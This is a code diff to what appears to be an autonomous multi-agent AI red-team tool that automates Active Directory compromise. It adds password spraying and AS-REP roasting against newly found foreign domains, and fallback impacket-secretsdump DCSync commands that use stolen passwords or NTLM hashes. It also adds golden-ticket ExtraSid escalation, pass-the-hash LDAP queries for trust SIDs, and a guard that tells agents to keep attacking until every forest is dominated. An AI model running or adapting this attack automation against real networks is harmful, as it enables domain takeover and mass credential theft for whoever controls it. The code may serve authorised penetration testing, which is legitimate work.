@@ -20,7 +20,7 @@ from dreadnode.agent import Agent, Thread
 from dreadnode.agent.stop import tool_use
 from loguru import logger
 from tenacity import (
-    retry,
+    AsyncRetrying,
     retry_if_exception_type,
     stop_after_attempt,
     wait_random_exponential,
@@ -83,6 +83,18 @@ def _resolve_orchestrator_model(model: str | None) -> str:
     return resolved
 
 
+async def _async_run_tool(*args: Any, **kwargs: Any) -> tuple[str, str, int]:
+    """Run a tool command without blocking the asyncio event loop.
+
+    Wraps the synchronous run_tool() in asyncio.to_thread() so that other
+    coroutines (background tasks, health checks, etc.) can continue while
+    the tool executes on a worker pod.
+    """
+    from ares.tools.red.common import run_tool
+
+    return await asyncio.to_thread(run_tool, *args, **kwargs)
+
+
 def _is_pass_the_hash_compatible(hash_value: str, hash_type: str | None) -> bool:
     if not hash_value:
         return False
@@ -101,6 +113,78 @@ def _is_pass_the_hash_compatible(hash_value: str, hash_type: str | None) -> bool
             return False
         return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
     return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))
+
+
+def _is_valid_secret_candidate(value: str | None) -> bool:
+    """Reject obvious parser/tool artifacts before scheduling auth attempts."""
+    if not value:
+        return False
+    normalized = value.strip().lower()
+    if not normalized:
+        return False
+    invalid_markers = (
+        "separator unmatched",
+        "saving ticket in",
+        "maximum steps reached",
+        "command timed out",
+        "traceback",
+        ".ccache",
+    )
+    return not any(marker in normalized for marker in invalid_markers)
+
+
+def _can_attempt_foreign_dcsync(state: SharedRedTeamState, username: str, domain: str) -> bool:
+    """Check if a credential should be tried for foreign DCSync.
+
+    For foreign (undominated) domains, we're more permissive: if we have no admin
+    info at all for the domain, try all credentials. The cost of a failed secretsdump
+    is just a timeout, while missing a DA credential means never dominating the forest.
+    """
+    normalized_user = (username or "").strip().lower()
+    normalized_domain = (domain or "").strip().lower()
+    if not normalized_user or not normalized_domain:
+        return False
+
+    # Always try well-known admin accounts
+    if normalized_user in {"administrator", "krbtgt"}:
+        return True
+
+    cred_key = f"{normalized_domain}:{normalized_user}"
+    if cred_key in state.golden_ticket_capable_creds:
+        return True
+
+    # Check if explicitly marked as admin
+    for cred in state.all_credentials:
+        if (
+            cred.username.lower() == normalized_user
+            and (cred.domain or "").lower() == normalized_domain
+            and cred.is_admin
+        ):
+            return True
+
+    for user in state.all_users:
+        if (
+            user.username.lower() == normalized_user
+            and (user.domain or "").lower() == normalized_domain
+            and user.is_admin
+        ):
+            return True
+
+    # For undominated foreign domains with no admin info, try all credentials.
+    # This handles cases like daenerys.targaryen being DA but not flagged as admin.
+    if normalized_domain in [d.lower() for d in state.get_undominated_forests()]:
+        # Check if we have ANY admin info for this domain
+        has_any_admin_info = any(
+            (c.domain or "").lower() == normalized_domain and c.is_admin
+            for c in state.all_credentials
+        ) or any(
+            (u.domain or "").lower() == normalized_domain and u.is_admin for u in state.all_users
+        )
+        if not has_any_admin_info:
+            # No admin info at all — try all creds (dedup will prevent retries)
+            return True
+
+    return False
 
 
 async def _wait_for_required_workers(
@@ -252,9 +336,9 @@ def _build_host_from_nmap(current: dict) -> Host | None:
         return None
     hostname = current["hostname"]
     # NOTE: Do NOT join short hostname with nmap's (Domain:...) to build FQDN.
-    # nmap's LDAP probe reports the forest root domain (e.g., "sevenkingdoms.local")
-    # even for child domain DCs (e.g., winterfell belongs to "north.sevenkingdoms.local").
-    # Joining produces wrong FQDNs like "winterfell.sevenkingdoms.local".
+    # nmap's LDAP probe reports the forest root domain (e.g., "contoso.local")
+    # even for child domain DCs (e.g., ws01 belongs to "child.contoso.local").
+    # Joining produces wrong FQDNs like "ws01.contoso.local".
     # The correct FQDN will be discovered by netexec SMB which reports the actual domain,
     # and merged via add_host()'s hostname upgrade logic.
     services_lower = [s.lower() for s in current["services"]]
@@ -588,6 +672,36 @@ def _create_completion_tools(
         Example:
             >>> complete_operation("Domain admin achieved via ADCS ESC1...")
         """
+        # In multi-forest mode, prevent premature completion when foreign
+        # domains haven't been discovered yet.  After DA, agents may still
+        # be running MSSQL / trust enumeration that would reveal new forests.
+        if get_multi_forest_mode() and shared_state.has_domain_admin:
+            if shared_state.all_forests_dominated():
+                # Check if there are still pending/running tasks that could
+                # discover foreign hosts (MSSQL exploits, trust enum, recon)
+                pending_count = len(shared_state.pending_tasks)
+                if pending_count > 0:
+                    logger.warning(
+                        f"🌲 Multi-forest mode: {pending_count} task(s) still running — "
+                        f"delaying completion to allow foreign domain discovery"
+                    )
+                    return (
+                        f"⚠️ Cannot complete yet: multi_forest_mode is enabled and "
+                        f"{pending_count} tasks are still running that may discover "
+                        f"foreign domains. Wait for tasks to finish, then retry."
+                    )
+            else:
+                undominated = shared_state.get_undominated_forests()
+                logger.warning(
+                    f"🌲 Multi-forest mode: refusing completion — "
+                    f"undominated forests: {undominated}"
+                )
+                return (
+                    f"⚠️ Cannot complete: multi_forest_mode is enabled and these "
+                    f"forests are NOT dominated yet: {undominated}. "
+                    f"Continue attacking these domains before completing."
+                )
+
         shared_state.completed = True
         logger.success(f"🎯 Multi-agent operation completed: {summary}")
         return f"✓ Operation marked as complete. Summary: {summary}"
@@ -798,6 +912,8 @@ async def run_multi_agent_operation(
             _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
         ),
         asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
+        asyncio.create_task(_auto_foreign_dcsync(dispatcher), name="auto_foreign_dcsync"),
+        asyncio.create_task(_auto_cross_forest_pivot(dispatcher), name="auto_cross_forest_pivot"),
     ]
 
     # Build initial prompt for orchestrator
@@ -1391,6 +1507,22 @@ async def _extend_operation_lock(
             logger.error(f"Error extending operation lock: {e}")
 
 
+def _should_stop_background_task(state: SharedRedTeamState) -> bool:
+    """Check if a background task should terminate.
+
+    In single-domain mode: stop when DA achieved or completed.
+    In multi-forest mode: stop only when ALL forests dominated or completed.
+    """
+    if state.completed:
+        return True
+    if not state.has_domain_admin:
+        return False
+    # DA achieved — check if multi-forest mode requires continuing
+    if get_multi_forest_mode():
+        return state.all_forests_dominated()
+    return True
+
+
 async def _auto_credential_expansion(
     dispatcher: RedTeamDispatcher,
     check_interval: float = 10.0,  # Reduced from 30s for faster lateral testing
@@ -1421,8 +1553,8 @@ async def _auto_credential_expansion(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping auto credential expansion")
                 break
 
@@ -1486,8 +1618,8 @@ async def _auto_mssql_detection(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping MSSQL detection")
                 break
 
@@ -1543,8 +1675,8 @@ async def _auto_adcs_enumeration(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping ADCS enumeration")
                 break
 
@@ -1796,8 +1928,8 @@ async def _auto_bloodhound(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping BloodHound automation")
                 break
 
@@ -2059,7 +2191,7 @@ async def _auto_credential_access(
         try:
             state = dispatcher.shared_state
 
-            if state.completed or state.has_domain_admin:
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping auto credential access")
                 break
 
@@ -2172,6 +2304,34 @@ async def _auto_credential_access(
                     if fruit_task_id:
                         logger.info(
                             f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
+                        )
+
+            # Dispatch no-creds recon for newly-discovered foreign domains
+            # (Even though we have creds for the primary domain, foreign domains
+            # need their own AS-REP/password spray/user enum pass)
+            if state.all_credentials or state.all_hashes:
+                foreign_domains = state.get_undominated_forests() if get_multi_forest_mode() else []
+                for fd in foreign_domains:
+                    if fd.lower() in state.processed_asrep_domains:
+                        continue
+                    fd_hosts = _iter_hosts_by_domain.get(fd.lower(), [])
+                    if not fd_hosts:
+                        continue
+                    fruit_task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=fd,
+                        target_ips=fd_hosts,
+                        reason="low_hanging_fruit_foreign_domain",
+                        techniques=[
+                            "username_as_password",
+                            "password_spray",
+                            "asrep_roast",
+                        ],
+                    )
+                    state.processed_asrep_domains.add(fd.lower())
+                    if fruit_task_id:
+                        logger.info(
+                            f"Auto credential access (low-hanging fruit) dispatched for foreign domain {fd}"
                         )
 
             # Check for new users without credentials - run username_as_password on them
@@ -2585,8 +2745,8 @@ async def _auto_coercion(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping auto coercion")
                 break
 
@@ -2766,8 +2926,8 @@ async def _auto_delegation_enumeration(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping delegation enumeration")
                 break
 
@@ -2896,8 +3056,8 @@ async def _auto_local_admin_secretsdump(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed or state.has_domain_admin:
+            # Skip if operation is complete (multi-forest aware)
+            if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping auto local admin secretsdump")
                 break
 
@@ -3133,8 +3293,6 @@ async def _get_domain_sid_via_ldap(
     import base64
     import re
 
-    from ares.tools.red.common import run_tool
-
     domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
     if cred and cred.password:
         cmd = [
@@ -3158,7 +3316,7 @@ async def _get_domain_sid_via_ldap(
     else:
         return None
     try:
-        stdout, _stderr, rc = run_tool(cmd, timeout_seconds=30, target_role="recon")
+        stdout, _stderr, rc = await _async_run_tool(cmd, timeout_seconds=30, target_role="recon")
         if rc != 0:
             return None
         b64_match = re.search(r"objectSid::\s*(\S+)", stdout)
@@ -3186,7 +3344,7 @@ def _binary_sid_to_string(sid_bytes: bytes) -> str:
     return f"S-{revision}-{id_auth}" + "".join(f"-{sa}" for sa in sub_auths)
 
 
-def _run_lookupsid_with_retry(
+async def _run_lookupsid_with_retry(
     cmd: list[str],
     timeout_seconds: int = 60,
     max_attempts: int = 3,
@@ -3208,25 +3366,28 @@ def _run_lookupsid_with_retry(
     Raises:
         TransientToolError: If all retries exhausted due to transient errors
     """
-    from ares.tools.red.common import run_tool
 
-    @retry(
+    async for attempt in AsyncRetrying(
         stop=stop_after_attempt(max_attempts),
         wait=wait_random_exponential(multiplier=1, max=30),
         retry=retry_if_exception_type(TransientToolError),
         reraise=True,
-    )
-    def _execute() -> tuple[str, str, int]:
-        stdout, stderr, return_code = run_tool(cmd, timeout_seconds=timeout_seconds)
+    ):
+        with attempt:
+            stdout, stderr, return_code = await _async_run_tool(
+                cmd, timeout_seconds=timeout_seconds
+            )
 
-        if return_code != 0 and _is_transient_tool_error(stderr, return_code):
-            err_preview = stderr[:150] if stderr else "empty stderr"
-            logger.warning(f"🎫 Transient lookupsid error (will retry): {err_preview}")
-            raise TransientToolError(f"Transient error: {stderr[:200] if stderr else 'no output'}")
+            if return_code != 0 and _is_transient_tool_error(stderr, return_code):
+                err_preview = stderr[:150] if stderr else "empty stderr"
+                logger.warning(f"🎫 Transient lookupsid error (will retry): {err_preview}")
+                raise TransientToolError(
+                    f"Transient error: {stderr[:200] if stderr else 'no output'}"
+                )
 
-        return stdout, stderr, return_code
+            return stdout, stderr, return_code
 
-    return _execute()
+    raise RuntimeError("lookupsid retry loop exited unexpectedly")
 
 
 async def _auto_golden_ticket(
@@ -3281,12 +3442,19 @@ async def _auto_golden_ticket(
                     # Merge Redis credentials into in-memory state
                     redis_creds = await backend.get_credentials()
                     for c in redis_creds:
-                        if not any(
-                            existing.username.lower() == c.username.lower()
-                            and existing.domain.lower() == (c.domain or "").lower()
-                            for existing in state.all_credentials
-                        ):
+                        existing_cred = next(
+                            (
+                                ex
+                                for ex in state.all_credentials
+                                if ex.username.lower() == c.username.lower()
+                                and ex.domain.lower() == (c.domain or "").lower()
+                            ),
+                            None,
+                        )
+                        if existing_cred is None:
                             state.all_credentials.append(c)
+                        elif c.is_admin and not existing_cred.is_admin:
+                            existing_cred.is_admin = True
                     # Merge Redis domain_admin_domains into in-memory state
                     redis_da_domains = await backend.get_domain_admin_domains()
                     for d in redis_da_domains:
@@ -3296,6 +3464,17 @@ async def _auto_golden_ticket(
                     # This allows inject-domain-sid CLI command to work for testing
                     redis_domain_sids = await backend.get_domain_sids()
                     state.domain_sids.update(redis_domain_sids)
+                    # Merge Redis domain_controllers into in-memory state
+                    # This allows manually set DC maps to be picked up
+                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
+                    redis_client = dispatcher._task_queue.redis
+                    redis_dcs = await redis_client.hgetall(dc_key)
+                    if redis_dcs:
+                        for dc_domain, dc_ip in redis_dcs.items():
+                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
+                            ip = dc_ip if isinstance(dc_ip, str) else dc_ip.decode()
+                            if d.lower() not in state.domain_controllers:
+                                state.domain_controllers[d.lower()] = ip
                 except Exception as sync_err:
                     logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
@@ -3444,8 +3623,6 @@ async def _auto_golden_ticket(
                 try:
                     from tenacity import RetryError
 
-                    from ares.tools.red.common import run_tool
-
                     sid_match = None  # Initialize for case where we skip lookupsid
                     output = ""  # Initialize for error handling
 
@@ -3484,7 +3661,9 @@ async def _auto_golden_ticket(
 
                         # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
                         try:
-                            stdout, stderr, _ = _run_lookupsid_with_retry(cmd, timeout_seconds=60)
+                            stdout, stderr, _ = await _run_lookupsid_with_retry(
+                                cmd, timeout_seconds=60
+                            )
                         except (TransientToolError, RetryError) as e:
                             # All retries exhausted due to transient errors (Redis timeout, network)
                             # Don't mark as permanently failed - allow retry on next check interval
@@ -3533,7 +3712,7 @@ async def _auto_golden_ticket(
                                     f"{c.domain}\\{c.username}"
                                 )
                                 try:
-                                    stdout, stderr, _ = _run_lookupsid_with_retry(
+                                    stdout, stderr, _ = await _run_lookupsid_with_retry(
                                         cmd, timeout_seconds=60
                                     )
                                     output = stdout + "\n" + (stderr or "")
@@ -3642,10 +3821,22 @@ async def _auto_golden_ticket(
                                     break
 
                             if not parent_dc_ip:
-                                logger.warning(
-                                    f"🎫 Auto-golden-ticket: Cached DC {cached_dc_ip} for {parent_domain} "
-                                    f"is not a valid parent DC (may be child DC), searching for correct DC"
-                                )
+                                # Check if the cached IP is different from
+                                # the child domain's DC — if so it's likely
+                                # the correct parent DC even without host
+                                # validation (host may not have is_dc yet)
+                                child_dc_ip_check = state.domain_controllers.get(domain.lower())
+                                if child_dc_ip_check and cached_dc_ip != child_dc_ip_check:
+                                    parent_dc_ip = cached_dc_ip
+                                    logger.info(
+                                        f"🎫 Auto-golden-ticket: Using cached DC {cached_dc_ip} "
+                                        f"for {parent_domain} (different from child DC {child_dc_ip_check})"
+                                    )
+                                else:
+                                    logger.warning(
+                                        f"🎫 Auto-golden-ticket: Cached DC {cached_dc_ip} for {parent_domain} "
+                                        f"is not a valid parent DC (may be child DC), searching for correct DC"
+                                    )
 
                         if not parent_dc_ip:
                             # Try to find parent DC from hosts by hostname
@@ -3752,7 +3943,7 @@ async def _auto_golden_ticket(
                                     f":{nt_hash}",
                                 ]
                             try:
-                                parent_stdout, parent_stderr, _ = _run_lookupsid_with_retry(
+                                parent_stdout, parent_stderr, _ = await _run_lookupsid_with_retry(
                                     parent_cmd, timeout_seconds=60
                                 )
                                 parent_output = parent_stdout + "\n" + (parent_stderr or "")
@@ -3872,9 +4063,9 @@ async def _auto_golden_ticket(
                     if parent_sid and parent_dc_ip:
                         # In child domains, dc_ip and parent_dc_ip are
                         # often SWAPPED because the child DC's hostname
-                        # is in the parent DNS zone (e.g., winterfell
-                        # registered as winterfell.sevenkingdoms.local
-                        # but is actually the DC for north.sk.local).
+                        # is in the parent DNS zone (e.g., ws01
+                        # registered as ws01.contoso.local
+                        # but is actually the DC for child.contoso.local).
                         # DNS SRV won't help (no dig on orchestrator).
                         #
                         # Robust approach: collect all candidate DC IPs
@@ -3940,7 +4131,9 @@ async def _auto_golden_ticket(
                         )
 
                         step1_cmd = ["bash", "-c", step1_bash]
-                        stdout, stderr, returncode = run_tool(step1_cmd, timeout_seconds=600)
+                        stdout, stderr, returncode = await _async_run_tool(
+                            step1_cmd, timeout_seconds=600
+                        )
                         output = stdout + "\n" + (stderr or "")
 
                         # Also resolve parent DC target for Step 2
@@ -3953,7 +4146,7 @@ async def _auto_golden_ticket(
                     else:
                         # No parent DC or no parent SID — just run ticketer.
                         # cmd already includes ExtraSid if parent_sid was set.
-                        stdout, stderr, returncode = run_tool(cmd, timeout_seconds=300)
+                        stdout, stderr, returncode = await _async_run_tool(cmd, timeout_seconds=300)
                         output = stdout + "\n" + (stderr or "")
 
                     if returncode == 0 or "Saving ticket" in output:
@@ -4029,20 +4222,123 @@ async def _auto_golden_ticket(
                                     )
 
                                     if not trust_hash_match:
-                                        # Show which candidates
-                                        # appeared and last 500 chars
-                                        found_markers = re.findall(
+                                        # Golden ticket DCSync failed
+                                        # (likely KDC_ERR_TGT_REVOKED
+                                        # due to PAC validation).
+                                        # Fallback: use DA credentials
+                                        # for direct DCSync.
+                                        re.findall(
                                             r"CANDIDATE_DC=(\S+)",
                                             output,
                                         )
                                         logger.warning(
-                                            f"🎫 Step 1 failed: "
-                                            f"{trust_account} not found "
-                                            f"in child DCSync output "
-                                            f"({len(output)} chars, "
-                                            f"markers={found_markers}). "
-                                            f"Last 800: "
-                                            f"{output[-800:]}"
+                                            f"🎫 Step 1 golden ticket "
+                                            f"DCSync failed, trying "
+                                            f"credential fallback for "
+                                            f"{trust_account}"
+                                        )
+                                        # Find DA cred for child domain
+                                        _fb_cred = None
+                                        _fb_hash = None
+                                        for c in state.all_credentials:
+                                            if (
+                                                c.domain
+                                                and c.domain.lower() == domain.lower()
+                                                and c.is_admin
+                                            ):
+                                                _fb_cred = c
+                                                break
+                                        if not _fb_cred:
+                                            for c in state.all_credentials:
+                                                if (
+                                                    c.domain
+                                                    and c.domain.lower() == domain.lower()
+                                                    and c.password
+                                                ):
+                                                    _fb_cred = c
+                                                    break
+                                        if not _fb_cred:
+                                            for h in state.all_hashes:
+                                                if (
+                                                    h.domain
+                                                    and h.domain.lower() == domain.lower()
+                                                    and h.username.lower() != "krbtgt"
+                                                    and h.hash_type.upper() == "NTLM"
+                                                ):
+                                                    _fb_hash = h
+                                                    break
+                                        child_nb = domain.split(".")[0].upper()
+                                        if _fb_cred and _fb_cred.password:
+                                            _fb_cmd = [
+                                                "impacket-secretsdump",
+                                                f"{domain}/{_fb_cred.username}:{_fb_cred.password}@{dc_ip}",
+                                                "-just-dc-user",
+                                                f"{child_nb}/{trust_account}",
+                                            ]
+                                            logger.info(
+                                                f"🎫 Step 1 fallback: "
+                                                f"credential DCSync "
+                                                f"{trust_account} via "
+                                                f"{_fb_cred.username}"
+                                            )
+                                        elif _fb_hash:
+                                            _nt = _fb_hash.hash_value
+                                            if ":" in _nt:
+                                                _nt = _nt.split(":")[-1]
+                                            _fb_cmd = [
+                                                "impacket-secretsdump",
+                                                f"{domain}/{_fb_hash.username}@{dc_ip}",
+                                                "-hashes",
+                                                f"aad3b435b51404eeaad3b435b51404ee:{_nt}",
+                                                "-just-dc-user",
+                                                f"{child_nb}/{trust_account}",
+                                            ]
+                                            logger.info(
+                                                f"🎫 Step 1 fallback: "
+                                                f"hash DCSync "
+                                                f"{trust_account} via "
+                                                f"{_fb_hash.username}"
+                                            )
+                                        else:
+                                            _fb_cmd = None
+                                            logger.warning(
+                                                f"🎫 Step 1 fallback: no credentials for {domain}"
+                                            )
+                                        if _fb_cmd:
+                                            _fb_out, _fb_err, _fb_rc = await _async_run_tool(
+                                                _fb_cmd,
+                                                timeout_seconds=180,
+                                            )
+                                            _fb_output = (_fb_out or "") + "\n" + (_fb_err or "")
+                                            trust_hash_match = re.search(
+                                                rf"{re.escape(trust_account)}"
+                                                rf":\d+:"
+                                                rf"([a-fA-F0-9]+:"
+                                                rf"[a-fA-F0-9]+)",
+                                                _fb_output,
+                                            )
+                                            trust_aes_match = re.search(
+                                                rf"{re.escape(trust_account)}"
+                                                rf":aes256-cts-hmac-sha1-96:"
+                                                rf"([a-fA-F0-9]+)",
+                                                _fb_output,
+                                            )
+                                            if trust_hash_match:
+                                                output = _fb_output
+                                                logger.success(
+                                                    f"🎫 Step 1 fallback "
+                                                    f"succeeded for "
+                                                    f"{trust_account}"
+                                                )
+                                            else:
+                                                logger.warning(
+                                                    f"🎫 Step 1 fallback "
+                                                    f"also failed: "
+                                                    f"{_fb_output[-400:]}"
+                                                )
+                                    if not trust_hash_match:
+                                        logger.warning(
+                                            f"🎫 Step 1 completely failed for {trust_account}"
                                         )
                                     else:
                                         trust_nt_hash = trust_hash_match.group(1)
@@ -4333,7 +4629,7 @@ async def _auto_golden_ticket(
                                             s2_stdout,
                                             s2_stderr,
                                             _s2_rc,
-                                        ) = run_tool(
+                                        ) = await _async_run_tool(
                                             step2_cmd,
                                             timeout_seconds=600,
                                         )
@@ -4371,13 +4667,115 @@ async def _auto_golden_ticket(
                                                 )
                                         else:
                                             logger.warning(
-                                                f"🎫 Step 2: no Admin "
-                                                f"hash from parent "
-                                                f"DCSync "
-                                                f"({len(parent_output)}"
-                                                f" chars). Output: "
-                                                f"{parent_output[:5000]}"
+                                                "🎫 Step 2: golden ticket "
+                                                "parent DCSync failed, "
+                                                "trying credential "
+                                                "fallback"
                                             )
+                                            # Credential fallback for
+                                            # parent DCSync — find any
+                                            # parent DA cred and use it
+                                            _p_cred = None
+                                            for c in state.all_credentials:
+                                                if (
+                                                    c.domain
+                                                    and c.domain.lower() == parent_domain.lower()
+                                                    and c.password
+                                                ):
+                                                    _p_cred = c
+                                                    break
+                                            if _p_cred:
+                                                parent_nb = parent_domain.split(".")[0].upper()
+                                                _p_targets = [
+                                                    f"{parent_nb}\\Administrator",
+                                                    f"{parent_nb}\\krbtgt",
+                                                ]
+                                                # Refresh undominated list
+                                                _fb_undom = (
+                                                    state.get_undominated_forests() or undominated
+                                                )
+                                                for fd in _fb_undom:
+                                                    fn = fd.split(".")[0].upper()
+                                                    _p_targets.append(f"{fn}$")
+                                                _all_p_out = ""
+                                                logger.info(
+                                                    f"🎫 Step 2 fallback: "
+                                                    f"credential DCSync "
+                                                    f"via {_p_cred.username}"
+                                                    f"@{parent_domain}"
+                                                    f" targets: "
+                                                    f"{_p_targets}"
+                                                )
+                                                _p_dc = parent_dc_step2 or parent_dc_ip
+                                                for _pt in _p_targets:
+                                                    _p_cmd = [
+                                                        "impacket-secretsdump",
+                                                        f"{parent_domain}/"
+                                                        f"{_p_cred.username}:"
+                                                        f"{_p_cred.password}"
+                                                        f"@{_p_dc}",
+                                                        "-just-dc-user",
+                                                        _pt,
+                                                    ]
+                                                    (
+                                                        _po,
+                                                        _pe,
+                                                        _prc,
+                                                    ) = await _async_run_tool(
+                                                        _p_cmd,
+                                                        timeout_seconds=120,
+                                                    )
+                                                    _all_p_out += (
+                                                        (_po or "") + "\n" + (_pe or "") + "\n"
+                                                    )
+                                                parent_output = _all_p_out
+                                                admin_m = re.search(
+                                                    r"Administrator:\d+:"
+                                                    r"[a-fA-F0-9]{32}:"
+                                                    r"([a-fA-F0-9]{32})",
+                                                    parent_output,
+                                                )
+                                                if admin_m:
+                                                    logger.success(
+                                                        "🎫 Step 2 fallback got parent Admin"
+                                                    )
+                                                    state.add_hash(
+                                                        Hash(
+                                                            username="Administrator",
+                                                            domain=parent_domain,
+                                                            hash_type="NTLM",
+                                                            hash_value=admin_m.group(1),
+                                                            source="auto_golden_ticket:parent_dcsync_fallback",
+                                                        ),
+                                                        "auto_golden_ticket",
+                                                    )
+                                                    state.has_domain_admin = True
+                                                    if parent_domain.lower() not in [
+                                                        d.lower()
+                                                        for d in state.domain_admin_domains
+                                                    ]:
+                                                        state.domain_admin_domains.append(
+                                                            parent_domain.lower()
+                                                        )
+                                                    # Cache parent DC IP so
+                                                    # trust dispatch can
+                                                    # find it
+                                                    state.domain_controllers[
+                                                        parent_domain.lower()
+                                                    ] = _p_dc
+                                                else:
+                                                    logger.warning(
+                                                        f"🎫 Step 2 fallback "
+                                                        f"also failed: "
+                                                        f"{parent_output[-500:]}"
+                                                    )
+                                            else:
+                                                logger.warning(
+                                                    f"🎫 Step 2: no parent "
+                                                    f"DA credentials for "
+                                                    f"fallback DCSync of "
+                                                    f"{parent_domain}"
+                                                )
 
                                         # Parse krbtgt + AES
                                         krbtgt_m = re.search(
@@ -4412,7 +4810,7 @@ async def _auto_golden_ticket(
                                             )
 
                                         # Parse foreign trust keys
-                                        # (e.g., ESSOS$ from parent)
+                                        # (e.g., FABRIKAM$ from parent)
                                         for fd in undominated:
                                             fn = fd.split(".")[0].upper()
                                             ta = f"{fn}$"
@@ -4461,6 +4859,139 @@ async def _auto_golden_ticket(
                                 except Exception as escalation_err:
                                     logger.warning(
                                         f"🎫 Parent domain escalation failed: {escalation_err}"
+                                    )
+
+                                # Extract foreign domain SIDs from
+                                # LDAP trust objects on the parent DC
+                                # (where we have DA).
+                                # This populates state.domain_sids so
+                                # the trust extraction dispatch can
+                                # include target_sid in the payload,
+                                # avoiding cross-forest get_sid failure.
+                                # Runs via run_tool on a worker pod
+                                # using the impacket venv Python.
+                                try:
+                                    admin_hash_for_sid = None
+                                    for h in state.all_hashes:
+                                        if (
+                                            h.username.lower() == "administrator"
+                                            and h.domain
+                                            and h.domain.lower() == parent_domain.lower()
+                                            and (h.hash_type or "").upper() == "NTLM"
+                                        ):
+                                            admin_hash_for_sid = h.hash_value
+                                            break
+
+                                    sid_dc = None
+                                    try:
+                                        sid_dc = parent_dc_step2 or parent_dc_ip
+                                    except NameError:
+                                        sid_dc = parent_dc_ip
+
+                                    # Refresh undominated in case
+                                    # hosts were added since Step 1
+                                    undominated = state.get_undominated_forests() or undominated
+                                    if admin_hash_for_sid and sid_dc and undominated:
+                                        parent_dn = ",".join(
+                                            f"DC={p}" for p in parent_domain.split(".")
+                                        )
+                                        sid_py = (
+                                            "import struct\n"
+                                            "from impacket.ldap import"
+                                            " ldap as ildap\n"
+                                            "from impacket.ldap import"
+                                            " ldapasn1 as la\n"
+                                            "def s2s(b):\n"
+                                            " r=b[0];n=b[1]\n"
+                                            " a=int.from_bytes("
+                                            "b[2:8],'big')\n"
+                                            " s=[struct.unpack('<I',"
+                                            "b[8+4*i:12+4*i])[0]"
+                                            " for i in range(n)]\n"
+                                            " return f'S-{r}-{a}-'"
+                                            "+'-'.join(str(x)"
+                                            " for x in s)\n"
+                                            "try:\n"
+                                            f" c=ildap.LDAPConnection("
+                                            f"'ldap://{sid_dc}',"
+                                            f"'{parent_dn}')\n"
+                                            f" c.login("
+                                            f"'Administrator','',"
+                                            f"domain="
+                                            f"'{parent_domain}',"
+                                            f"nthash="
+                                            f"'{admin_hash_for_sid}')\n"
+                                            f" r=c.search("
+                                            f"searchFilter="
+                                            f"'(objectClass="
+                                            f"trustedDomain)',"
+                                            f"attributes=['trustPartner'"
+                                            f",'securityIdentifier'],"
+                                            f"searchBase="
+                                            f"'CN=System,"
+                                            f"{parent_dn}')\n"
+                                            " for item in r:\n"
+                                            "  if not isinstance("
+                                            "item,la.SearchResultEntry"
+                                            "):continue\n"
+                                            "  p='';sid=''\n"
+                                            "  for at in"
+                                            " item['attributes']:\n"
+                                            "   nm=str(at['type'])\n"
+                                            "   vs=at['vals']\n"
+                                            "   if nm=='trustPartner'"
+                                            " and vs:p=str(vs[0])\n"
+                                            "   elif nm=="
+                                            "'securityIdentifier'"
+                                            " and vs:\n"
+                                            "    sid=s2s("
+                                            "bytes(vs[0]))\n"
+                                            "  if p and sid:\n"
+                                            "   print("
+                                            "f'TRUST:{p}:{sid}')\n"
+                                            "except Exception as e:\n"
+                                            " print(f'ERROR:{e}')\n"
+                                        )
+                                        sid_cmd = [
+                                            "/opt/impacket/venv/bin/python",
+                                            "-c",
+                                            sid_py,
+                                        ]
+                                        sid_out, sid_err, _sid_rc = await _async_run_tool(
+                                            sid_cmd, timeout_seconds=30
+                                        )
+                                        found_trust_sids = False
+                                        for sid_line in (sid_out or "").splitlines():
+                                            if sid_line.startswith("TRUST:"):
+                                                parts = sid_line.split(":", 2)
+                                                if len(parts) == 3:
+                                                    trust_dns = parts[1].lower()
+                                                    trust_sid_val = parts[2]
+                                                    if (
+                                                        trust_sid_val
+                                                        and trust_sid_val.startswith("S-1-5-21-")
+                                                        and trust_dns not in state.domain_sids
+                                                    ):
+                                                        state.domain_sids[trust_dns] = trust_sid_val
+                                                        await backend.set_domain_sid(
+                                                            trust_dns, trust_sid_val
+                                                        )
+                                                        logger.info(
+                                                            f"🌲 Trust SID via LDAP: "
+                                                            f"{trust_dns} → {trust_sid_val}"
+                                                        )
+                                                        found_trust_sids = True
+                                        if not found_trust_sids:
+                                            logger.warning(
+                                                f"🌲 LDAP trust SID query returned no "
+                                                f"foreign domain SIDs: "
+                                                f"{(sid_out or '')[:300]} "
+                                                f"{(sid_err or '')[:200]}"
+                                            )
+                                except Exception as sid_extract_err:
+                                    logger.warning(
